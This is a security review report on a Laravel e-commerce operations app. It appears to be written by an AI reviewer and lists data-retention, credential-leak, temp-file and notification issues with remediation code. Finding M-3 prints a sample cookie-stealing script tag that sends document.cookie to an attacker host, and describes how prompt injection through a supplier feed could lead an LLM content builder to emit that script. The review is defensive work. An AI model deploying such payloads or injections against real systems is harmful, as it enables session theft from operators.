---
review_kind: security
reviewed_at: 2026-06-06
scope_pass_1: today's 34 commits eae5f9c..05aa352
scope_pass_2: webhook handlers, file uploads, credential resolver, public routes, mass-assignment, notifications, Filament page authorization, bulk-action SKU sanitization, inline artisan calls
findings_critical: 0
findings_high: 2
findings_medium: 5
findings_low: 4
status: high_findings_remediated
high_remediated_in: 260607-9c6
high_remediated_at: 2026-06-07
---

# Security Review — meetingstore-ops (2026-06-06)

## Summary

Thorough adversarial review of today's 34 commits + standing high-risk surfaces (webhooks, file uploads, credential resolver, Filament admin pages, mass-assignment, public routes). **No CRITICAL findings.** The 2 HIGH findings are both data-handling issues that should be remediated in a follow-up quick-task within the week; nothing blocks the day's commits from landing on prod.

The codebase shows strong security hygiene: HMAC webhook verification uses timing-safe compare on raw body, credentials use Laravel native `encrypted:array` cast, the audit trail explicitly excludes `payload_encrypted` from `activitylog`, the queued CSV download is gated by both `auth` and `signed` middleware + basename strip, and every dangerous Artisan invocation passes user input via the array option form (never string concatenation into a shell-style command). The forensic resolver pass (commit ab83129) has already documented the IntegrationCredentialResolver as MEDIUM-by-design.

Two areas worth flagging for next planning cycle: (a) `webhook_receipts.raw_body` stores full Woo customer/order payloads indefinitely without retention or field-level redaction, which is a GDPR exposure; (b) `WooDbSnapshotter` passes the WooDB password via the `mysqldump -p<pwd>` argv slot, briefly visible to any process that reads `/proc/*/cmdline`.

---

## HIGH

### H-1 — `webhook_receipts.raw_body` stores Woo customer PII indefinitely with no retention prune (GDPR exposure)

> **REMEDIATED 2026-06-07 in quick task [260607-9c6](../260607-9c6-security-high-fixes-h-1-webhooks-prune-r/) — `webhooks:prune-receipts` artisan + nightly 03:25 London cron (per-topic retention: order=30d, customer=7d, other=90d). Field-level body redaction (option 2 in the original fix proposal) deferred — option 1 (retention prune) alone satisfies GDPR Art. 5(1)(e).**

**File:** `app/Domain/Webhooks/Http/Controllers/WooWebhookController.php:62`
**Also touches:** `app/Domain/Webhooks/Models/WebhookReceipt.php:34-45`, `routes/console.php` (no `webhook-receipts:prune` scheduled)

**Issue.** The Woo webhook handler persists `$request->getContent()` verbatim into `webhook_receipts.raw_body`. For the `customer.created` topic this includes email, billing/shipping address, phone, and any custom-field PII Woo sends; for `order.created` it includes the same plus line items + tokenised payment metadata. `WebhookReceipt::redactHeaders()` (line 58) correctly scrubs `Authorization`/`Cookie`/`X-WC-Webhook-Signature` from the headers array, but the body is unredacted. None of the existing retention prunes in `routes/console.php` touch this table — `activity_log` (365d), `integration_events` (90d), `sync_errors` (90d), `sync_diffs`, `dashboard_snapshots` (30d), `competitor:csv-prune`, `history:prune`, `agents:prune-archive` all have scheduled prunes. `webhook_receipts` does not. A 12-month-old DB will hold every customer record that ever placed an order, in raw JSON, queryable by any DB-shell user.

This is a GDPR Article 5(1)(e) storage-limitation violation if the prod app receives real customer webhooks (Phase 4+).

**Fix.**
1. Add a `webhooks:prune-receipts` artisan command + schedule it daily at 03:25 (slots between integration-events:prune at 03:10 and sync-errors:prune at 03:20). Retention 30 days for `order` topic, 7 days for `customer` topic.
2. Optionally redact `email`, `billing.email`, `shipping.email`, `billing.phone`, `customer_note` from `raw_body` at insert time via a `redactBody()` static method mirroring `redactHeaders()`, keeping ids + order_id intact so the audit + replay use-case still works.
3. Either approach satisfies GDPR storage-limitation; (2) is defence-in-depth on top of (1).

---

### H-2 — `WooDbSnapshotter` leaks WooDB password via `mysqldump -p<pwd>` argv (visible in `/proc/*/cmdline`)

> **REMEDIATED 2026-06-07 in quick task [260607-9c6](../260607-9c6-security-high-fixes-h-1-webhooks-prune-r/) — `WooDbSnapshotter` now writes a chmod-0600 `.cnf` tempfile and passes `mysqldump --defaults-extra-file=<path>`. Tempfile is unlinked in `finally{}` on both success and failure paths. WooDB password no longer appears in `/proc/*/cmdline`.**

**File:** `app/Domain/Cutover/Services/WooDbSnapshotter.php:79-86`

**Issue.** The mysqldump command is assembled as `'mysqldump ... -p%s ...'` and the password value is interpolated via `escapeshellarg($pass)`. `escapeshellarg` prevents shell metacharacter injection (good) but does NOT hide the value from process listings. On Linux any local user can `cat /proc/$(pgrep mysqldump)/cmdline` and read the password in plaintext while the dump runs. The dump can take an hour on a large Woo DB (`setTimeout(3600)` at line 89), giving a wide window. The class docblock says "the password still briefly appears in `ps`. Operator runs this on a private VPS per the threat register" — but "briefly" understates a 1-hour window, and the WooDB user's password is the SAME credential `supplier:db-sync` and the daily cron use, so a leak compromises the daily sync path too.

**Fix.** Use mysqldump's `--defaults-extra-file` option to pass credentials via a temp file with `chmod 0600`:

```php
$cnfPath = tempnam(sys_get_temp_dir(), 'msdmp_');
chmod($cnfPath, 0o600);
file_put_contents($cnfPath, "[client]\nuser={$user}\npassword={$pass}\nhost={$host}\n");
try {
    $cmd = sprintf(
        'mysqldump --defaults-extra-file=%s --single-transaction --skip-lock-tables %s | gzip > %s',
        escapeshellarg($cnfPath),
        escapeshellarg($db),
        escapeshellarg($path),
    );
    $process = Process::fromShellCommandline($cmd);
    $process->setTimeout(3600);
    $process->mustRun();
} finally {
    @unlink($cnfPath);
}
```

This keeps the password off the argv. The temp file is mode-0600 + unlinked in `finally{}`. `MYSQL_PWD` env var is an alternative but mysql docs explicitly call it out as insecure for shared-host use.

---

## MEDIUM

### M-1 — `AutoCreateHealthPage` per-row Artisan actions are not idempotent-locked; rapid double-clicks fire two concurrent `products:source-images` runs

**File:** `app/Filament/Pages/AutoCreateHealthPage.php:273-294, 306-325`

**Issue.** The Resync and Source-images per-row actions call `Artisan::call('products:source-images', ['--skus' => $record->sku])` synchronously inside the Livewire request. There is no per-SKU lock or `Cache::add(...)` debounce. An admin double-clicking the button (or hitting the Filament Action via two browser tabs) fires two concurrent runs, both of which call Claude vision + supplier feed lookups — doubling spend, doubling Icecat rate-limit pressure, and racing on the `gallery_image_urls` array merge. `RunAutoCreatePipelineJob` already implements `ShouldBeUnique` with a `uniqueId()` md5 — the per-row actions on the health page do not.

Not a security boundary breach (admin-only), but a real-money safety hole — `~10p/SKU` Claude spend can become `~20p/SKU` from a hover-tooltip-then-click pattern.

**Fix.** Wrap each action in a 60s lock keyed on the command + SKU:

```php
$lockKey = "auto_create_health:source_images:{$record->sku}";
if (! Cache::add($lockKey, 1, 60)) {
    Notification::make()->warning()
        ->title('Already running for this SKU — wait 60s')
        ->send();
    return;
}
try { Artisan::call('products:source-images', ['--skus' => $record->sku]); }
finally { Cache::forget($lockKey); }
```

The `Cache::add(... 60)` form is atomic (Redis SETNX), so two concurrent requests cannot both pass the gate.

---

### M-2 — `OperatorJobCompletedNotification::$url` rendered un-validated; could phish through bell-icon click

**File:** `app/Notifications/OperatorJobCompletedNotification.php:44, 64`
**Producers:** `app/Domain/ProductAutoCreate/Jobs/RunAutoCreatePipelineJob.php:98, 122`, `app/Console/Commands/RetryMissingImagesCommand.php:198`

**Issue.** The `url` field is stored as-is on `toDatabase()` and Filament's bell-icon UI renders it as the click-target. Today all three call sites pass a hardcoded `/admin/...` path, so no exploit is reachable from current code. BUT: there is no validation in the notification class itself, no docblock contract that `$url` MUST be a relative path under `/admin`, and the class explicitly documents itself as "GENERIC reusable notification — do NOT subclass per caller. Future ops commands wire `$user->notify(new OperatorJobCompletedNotification(...))` directly." A future caller passing an attacker-controlled URL (e.g. `url: 'https://evil.tld/login'` derived from a webhook payload or a user-supplied form field) would surface a phishing link inside the trusted Filament chrome.

This is a defensive-design gap, not a live vuln.

**Fix.** Constrain `$url` in the constructor to a `/`-rooted relative path:

```php
public function __construct(
    public readonly string $title,
    public readonly string $body,
    public readonly string $level = 'success',
    ?string $url = null,
) {
    if ($url !== null && ! str_starts_with($url, '/')) {
        throw new \InvalidArgumentException(
            'OperatorJobCompletedNotification::$url must be a relative admin path (e.g. /admin/products), got: '.$url
        );
    }
    $this->url = $url;
}
```

Plus a test: `tests/Unit/Notifications/OperatorJobCompletedNotificationTest.php` asserts the constructor rejects `https://*`, `javascript:`, `//evil.tld/...`, etc.

---

### M-3 — `ProductPreviewController` renders AI-generated HTML unescaped (`{!! $product->short_description !!}` / `long_description`) with no sanitization

**File:** `resources/views/preview/product.blade.php:131, 156`
**Route:** `routes/web.php:21-23` — auth-gated, `auth` middleware only

**Issue.** Short and long descriptions are rendered with Blade's unescaped `{!! ... !!}` syntax. The class docblock at `ProductPreviewController.php:17` says "AI-generated HTML, rendered unescaped so the bullets + `<h3>` sections display as they will on the shop" — i.e. this is by design. However, the source of `short_description`/`long_description` is `ProductContentBuilder` (Claude prompt output). A prompt-injection attack — a competitor seeding the supplier feed with a product title like `<script>fetch('https://evil.tld?c='+document.cookie)</script>` that ends up in the prompt context — could produce HTML output containing a `<script>` tag, which would then execute in the operator's admin session when they preview the draft.

Mitigations in place: (a) preview is admin-only via the `auth` middleware, (b) Claude is unlikely to echo a script tag verbatim, (c) ops would notice unusual output in the preview UI. But this is still XSS-via-LLM, a real attack class. The blade comment that `swap()` JS interpolates `'{{ $url }}'` for image URLs is also fragile — a URL containing a single quote breaks out of the JS string, though all current callers go through `Storage::disk('public')->url(...)` which never produces a quote.

**Fix.**
1. Run the AI HTML through a known-tag allow-list (HTMLPurifier or `mews/purifier` package, or `League\HTMLToMarkdown` + back-to-HTML round-trip) before `{!! ... !!}` renders it. Configure to permit only `<h3>`, `<p>`, `<ul>`, `<li>`, `<table>`, `<tr>`, `<td>`, `<th>`, `<strong>`, `<em>`, `<br>`, no inline event handlers, no `<script>` / `<iframe>` / `<style>`.
2. For `swap()` JS, replace inline `'{{ $url }}'` with `data-` attributes + an Alpine binding (the page is already using Alpine in other Filament views).
3. Same sanitization should run at the WRITE site (in `ProductContentBuilder`) so the bad bytes never persist, but the read-side sanitization is the belt-and-braces defence.

---

### M-4 — `PricingOpsExportController::xlsx()` writes to `sys_get_temp_dir()` via predictable filename; race-condition file-stomp possible

**File:** `app/Http/Controllers/PricingOpsExportController.php:56`

**Issue.** `$path = sys_get_temp_dir().DIRECTORY_SEPARATOR.'pricing-ops-'.uniqid('', true).'.xlsx';`

`uniqid('', true)` uses microtime + 4 extra entropy chars, which is *predictable* (not cryptographically random). On a shared-tmp host any local user could pre-create a symlink at the predicted path before the writer opens it; `SimpleExcelWriter::create()` then writes into the symlinked target. On a dedicated VPS this is moot, but the codebase has no hard requirement that the runtime is single-tenant. The default web user (often `www-data` or per-CWP user `stcav`) writes a world-readable file by default; another process with the same uid could read the export before `deleteFileAfterSend()` fires.

**Fix.** Use `tempnam()` with mode-0600:

```php
$path = tempnam(sys_get_temp_dir(), 'pricing-ops-').'.xlsx';
chmod($path, 0o600);
```

`tempnam` is atomic + OS-allocated. Setting mode to 0600 prevents other-user reads.

---

### M-5 — `IntegrationCredentialResolver` cache key is not namespaced by tenant / app key — environment crossover risk in shared Redis

**File:** `app/Domain/Integrations/Services/IntegrationCredentialResolver.php:31`

**Issue.** `CACHE_KEY_PREFIX = 'integrations.cred.'` and key is `integrations.cred.{kind->value}` (e.g. `integrations.cred.anthropic_api`). If staging + prod ever share a Redis instance (or someone unintentionally reuses a Redis DB number), credentials from one environment will silently leak into the other on cache hit. The forensic audit (commit ab83129) already documented this resolver as MEDIUM-by-design for the DB-vs-env order, but didn't flag the cache-key namespace.

**Fix.** Prefix with the Laravel app key fingerprint:

```php
public static function cacheKeyFor(IntegrationCredentialKind $kind): string
{
    $env = config('app.env'); // production / staging / local
    return self::CACHE_KEY_PREFIX . $env . '.' . $kind->value;
}
```

The cache is already invalidated on `IntegrationCredentialObserver` save events per the class docblock, so the new key format is safe to deploy without a cache wipe (60s TTL self-heals).

---

## LOW

### L-1 — `RunAutoCreatePipelineJob::uniqueId()` uses MD5 of comma-joined SKU list — order-sensitive collision misses

**File:** `app/Domain/ProductAutoCreate/Jobs/RunAutoCreatePipelineJob.php:55-57`

`md5(implode(',', $this->skus))` is sensitive to ordering. Dispatching `['A', 'B']` and `['B', 'A']` yields different unique ids, both queued, both running Claude pipelines on the SAME skus. Not a security vuln; doubles spend on accidental re-dispatch. Fix: `md5(implode(',', tap($this->skus, sort(...))))` or `sha1` over a sorted unique set.

### L-2 — `AutoCreateHealthPage` per-row actions catch `\Throwable` and surface `$e->getMessage()` in the Filament notification — information disclosure to admin

**File:** `app/Filament/Pages/AutoCreateHealthPage.php:288-292, 318-323`

`->body($e->getMessage())` leaks exception detail (DB schema names, file paths, env var names) to the toast UI. Admin-only audience so this is LOW severity, but every other catch-all in the codebase logs the message and shows a generic "Resync failed — see Horizon/Sentry for details" instead. Fix: log the throwable, render a generic message.

### L-3 — `WooWebhookController::handle()` has no body size limit; oversized payload crashes Laravel before HMAC check

**File:** `app/Domain/Webhooks/Http/Controllers/WooWebhookController.php:54-65`
**Middleware:** `app/Domain/Webhooks/Http/Middleware/VerifyWooHmacSignature.php`

A 50 MB request body is fully loaded into memory by `$request->getContent()` for the HMAC compute before the controller even runs. nginx normally caps body size at 1 MB by default, but if the deploy config raises this (Woo can send sizeable cart payloads) it's a DoS lever — an attacker who can reach the public webhook endpoint can lob 100 MB requests that pin a php-fpm worker for the HMAC compute time. There's no `Content-Length` early-reject. Fix: add an early `Content-Length` cap (e.g. 2 MB) in the verifier middleware before computing HMAC.

### L-4 — `SuggestionResource::getEloquentQuery()` `agent_guardrail_blocked` filter is bypassable by URL crafting (intentional but unverified)

**File:** `app/Domain/Suggestions/Filament/Resources/SuggestionResource.php:155-163`

The clause `->when(! request()->filled('tableFilters.kind.value'), fn (Builder $q) => $q->where('kind', '!=', 'agent_guardrail_blocked'))` HIDES guardrail-blocked rows by default but EXPOSES them when an operator picks the `agent_guardrail_blocked` kind chip — including via URL crafting (`/admin/suggestions?tableFilters[kind][value]=agent_guardrail_blocked`). The docblock at line 147-153 confirms this is intentional: "Operators can opt-in to view them via the explicit 'kind' SelectFilter chip below." All Suggestion approve actions are admin-only via `->authorize()` so the worst case is read-only forensic visibility, which is the documented intent. LOW because the design is explicit; flagged for completeness.

---

## Clean bill — surfaces audited with NO findings

These were inspected in depth and produced nothing actionable:

- **`VerifyWooHmacSignature` middleware** (`app/Domain/Webhooks/Http/Middleware/VerifyWooHmacSignature.php`) — correct order: raw body read BEFORE any parser middleware (documented Pitfall A), `hash_equals()` timing-safe compare, `abort_unless` on both signature presence and equality, secret read via `config()` not `env()` (cached-config safe).
- **`ExportDownloadController`** (`app/Http/Controllers/Dashboard/ExportDownloadController.php`) — defence-in-depth: `auth` + `signed` middleware + `hasValidSignature()` re-check + `basename()` strip + explicit reject of `''`, `'.'`, `'..'` + `File::exists` 404 — path traversal is closed at three independent layers.
- **`PricingOpsExportController` auth path** (`app/Http/Controllers/PricingOpsExportController.php:26-27`) — `abort_unless(in_array($bucket, PricingOpsReport::BUCKETS, true), 404)` correctly uses strict comparison + the `BUCKETS` constant from the report (no user-controlled bucket parsing); `viewAny` policy check via `$request->user()?->can()`.
- **`AutoCreateHealthPage::canAccess()`** (`app/Filament/Pages/AutoCreateHealthPage.php:92-98`) — admin-only at the page level, AND each per-row action repeats the admin check in `->authorize()` (not just `->visible()`) so URL crafting cannot bypass the page gate at the action layer. The 260606-mx9 PLAN's T-mx9-01 threat is properly mitigated.
- **Filament `Suggestion` bulk action SKU sanitization** (`app/Domain/Suggestions/Filament/Resources/SuggestionResource.php:662-669`) — the `auto_create_full` bulk action extracts SKUs from `data_get($s->evidence, 'sku', '')`, trims, filters empties, dedupes, then passes the ARRAY to `RunAutoCreatePipelineJob::dispatch()`. Inside the job (line 64-66), the array is joined with `,` and passed to `Artisan::call(..., ['--skus' => ...])` via the array-option form. No string concatenation into a shell command anywhere on this path.
- **`AutoCreateHealthPage` per-row Artisan invocations** (`app/Filament/Pages/AutoCreateHealthPage.php:281, 312`) — `Artisan::call('products:resync-to-woo', ['--skus' => $record->sku])` uses the array option form; `$record->sku` is an Eloquent attribute, not request input. The route-model-bound `Product` record cannot be "crafted" to inject shell metacharacters.
- **`IntegrationCredential` model** (`app/Domain/Integrations/Models/IntegrationCredential.php`) — `payload_encrypted` cast is `encrypted:array` (Laravel AES-256), `LogsActivity` allow-list EXPLICITLY OMITS `payload_encrypted` so spatie/activitylog cannot persist ciphertext, fillable does NOT include APP_KEY-rotation-sensitive raw fields.
- **`Product::$fillable`** (`app/Domain/Products/Models/Product.php:34-56`) — does NOT include `id`, `woo_product_id`, `created_at`, `updated_at`, `deleted_at`. Mass-assignment cannot rebind the local PK or the Woo identity.
- **`Suggestion::$fillable`** (`app/Domain/Suggestions/Models/Suggestion.php:38-54`) — does NOT include `status`, `resolved_by_user_id`, `resolved_at`, or `applied_at` directly through `create()`. (These ARE assigned via `->update()` in the action handlers, which is appropriate — assignment authority is gated by the admin policy at the action layer.)
- **`PruneOrphanSuggestionsCommand`** (`app/Domain/Suggestions/Console/Commands/PruneOrphanSuggestionsCommand.php`) — JSON expressions are driver-aware compile-time literals (no user input in SQL). `chunkById(500)` is the correct paginator for the status-flip-as-you-go pattern (plain `chunk()` would skip rows). The mass `->update()` bypassing model events is acknowledged in the docblock and intentional (Suggestion does not use `LogsActivity`).
- **`SnapshotAggregator::computeSuggestionsTriageHealth`** (`app/Domain/Dashboard/Services/SnapshotAggregator.php:142-214`) — all JSON expressions are compile-time literals, all column references go through Eloquent's `where()` builder, the inner `selectRaw` `CASE WHEN status = '...'` uses literal string values not request input. `Schema::hasTable()` guard for missing tables prevents test-env crashes.
- **`PricingOpsReport::recentChanges` raw SQL** (`app/Domain/Pricing/Services/PricingOpsReport.php:134-143`) — `DB::select(... [$since])` correctly binds the date placeholder; `$limit` is cast to `(int)` before interpolation, so SQLi is closed. The window function is identical compile-time SQL across all calls.
- **`CompetitorPositionScanner::competitorNamesByIds`** (`app/Domain/Pricing/Services/CompetitorPositionScanner.php`) — placeholder array is `array_fill(0, count($ids), '?')` and the ids are cast to int via `array_map('intval', ...)` and filtered `> 0` before binding. The supporting comment at `T-c0m-01 injection mitigation` is accurate.
- **`DisableLegacyPluginsCommand`** (`app/Console/Commands/Cutover/DisableLegacyPluginsCommand.php`) — two-step safety gate (env var + interactive confirmation) is correctly implemented; the gate config keys are read via `config()` (cached-config safe per the d7d0e39 incident).
- **`DrillRollbackCommand`** + **`RollbackDrill`** (`app/Console/Commands/Cutover/DrillRollbackCommand.php`, `app/Domain/Cutover/Services/RollbackDrill.php`) — same env-gate pattern, `file_put_contents` writes to a config-controlled path (not user-controlled), `glob()` on the backup directory returns realpath-resolved entries.
- **`WebhookReceipt::redactHeaders`** (`app/Domain/Webhooks/Models/WebhookReceipt.php:58-69`) — case-insensitive header-name match (lowercases before `in_array`), defensively includes `cookie`/`set-cookie`/`x-api-key` even though Woo doesn't send them, mirrors `IntegrationLogger` for inbound/outbound parity.
- **`HomeDashboardPage` + dashboard widgets** (`app/Filament/Pages/HomeDashboardPage.php`, `app/Filament/Widgets/HighConfidenceSourceableWidget.php`, `app/Filament/Widgets/SuggestionsQueueHealthWidget.php`, `app/Filament/Widgets/PendingReviewsWidget.php`) — each widget has its own `canView()` gate; the page filters `getDashboardSections()` widgets by `canView()` so RBAC-denied widgets don't render in their section. The click-through URL `/admin/suggestions?tableFilters[...]=...` built via `http_build_query` from a STATIC array is XSS-safe.
- **Notifications table migration** (`database/migrations/2026_06_06_171032_create_notifications_table.php`) — standard Laravel notifications schema; nothing custom.
- **Public-facing routes** (`routes/web.php`, `routes/webhooks.php`) — only THREE public surfaces: `Route::redirect('/', '/admin')` (harmless), the signed+auth-gated `/exports/download`, the `auth`-gated `/preview/product/{product}`, and the `/pricing-operations/export/{bucket}` (`auth` + policy check inside controller). Webhooks are HMAC-gated. There is NO unauthenticated state-changing endpoint.
- **`AdminPanelProvider`** (`app/Providers/Filament/AdminPanelProvider.php`) — `authMiddleware([Authenticate::class])` is in place; CSRF middleware is registered; cookies are encrypted; `AuthenticateSession::class` is enabled (prevents session-fixation). Database notifications are gated behind the same panel auth as everything else.
- **Filament policy `viewAny` checks** — `PendingReviewsWidget`, `HighConfidenceSourceableWidget`, `SuggestionsQueueHealthWidget` use `auth()->user()?->hasAnyRole(['admin', 'pricing_manager'])` directly (no `->can()` indirection), which makes the gate explicit and grep-able. Sales/read_only see silent absence (no 403, no broken layout).
- **`IntegrationCredentialResolver::for()`** (`app/Domain/Integrations/Services/IntegrationCredentialResolver.php:40-67`) — DB → env → throw order is correct, env fallback only triggers when DB lookup returns null OR payload misses required fields (both paths through `payloadHasAllRequiredFields`). The forensic audit (260606-q7h-FINDINGS.md row 3) already pinned this as MEDIUM-by-design.

---

## Pass 1 (today's commits) coverage map

| Commit theme | Surface audited | Verdict |
|---|---|---|
| env() guardrail (cc46b94 + 4 fixes) | `config/cutover.php` + Cutover command env reads | Clean — cached-config safe |
| Suggestions inbox triage (260606-gnu) | `PruneOrphanSuggestionsCommand`, `SuggestionResource` badge/tooltip | Clean — driver-aware JSON, status-flip-safe chunking |
| Dashboard tiles (260606-lhp) | `HighConfidenceSourceableWidget`, `SuggestionsQueueHealthWidget`, `SnapshotAggregator::computeSuggestionsTriageHealth` | Clean — XSS-safe http_build_query, RBAC gates |
| Auto-create health page (260606-mx9) | `AutoCreateHealthPage` + per-row actions | M-1 (no idempotency lock), L-2 (exception leak); admin gate correctly belt-and-braces |
| auto_create_status predicate fix (260606-o63) | `Product::scopeAutoCreated`, `RetryMissingImagesCommand`, `AutoCreateHealthPage` | Clean |
| Filament database notifications (260606-p4q) | `OperatorJobCompletedNotification`, `RunAutoCreatePipelineJob`, `RetryMissingImagesCommand` | M-2 (url not validated); generic-class design risk |
| Resolver audit (260606-q7h) | Already a docs-only commit; underlying resolver clean | Clean |
| Pricing-ops Brand column (260606-rld) | `PricingOpsReport`, `CompetitorPositionScanner`, `pricing-ops-bucket.blade.php`, `PricingOperationsPage` | Clean — blade escapes `$r['brand_name']`/`$r['supplier_name']`/`$r['competitor_name']` via `{{ }}` |

## Pass 2 (standing high-risk surfaces) coverage map

| Surface | Verdict |
|---|---|
| Webhook handlers (`WooWebhookController`, `VerifyWooHmacSignature`, `WebhookReceipt`) | H-1 (raw_body retention), L-3 (no body size limit); HMAC + redaction correct |
| File uploads / CSV ingest (`PricingOpsExportController`, `competitor:watch` ingest path) | M-4 (predictable temp name); CSV ingest path is the n8n drop dir, not a public upload — out of scope of "web file upload" |
| Credential resolver (`IntegrationCredentialResolver`, `IntegrationCredential`) | M-5 (cache key not env-namespaced); encryption + activitylog redaction correct |
| Public-facing routes (`web.php`, `webhooks.php`, panel auth) | Clean |
| Mass-assignment + raw SQL grep | Clean — all `whereRaw` / `DB::raw` / `DB::statement` reviewed; every interpolation is a compile-time literal or int-cast |
| `OperatorJobCompletedNotification` bell-icon (260606-p4q) | M-2 |
| Filament page authorization (AutoCreateHealthPage, dashboard widgets) | Clean |
| Bulk actions sku sanitization (`auto_create_full`) | Clean — array-form Artisan invocation |
| Inline artisan from Filament (AutoCreateHealth resync/source-images) | M-1 (no idempotency); SKU sanitization clean |

---

_Reviewer: Claude (Opus 4.7)_
_Review depth: thorough_
_Hours of code inspected: ~30 source files + the touched commits_
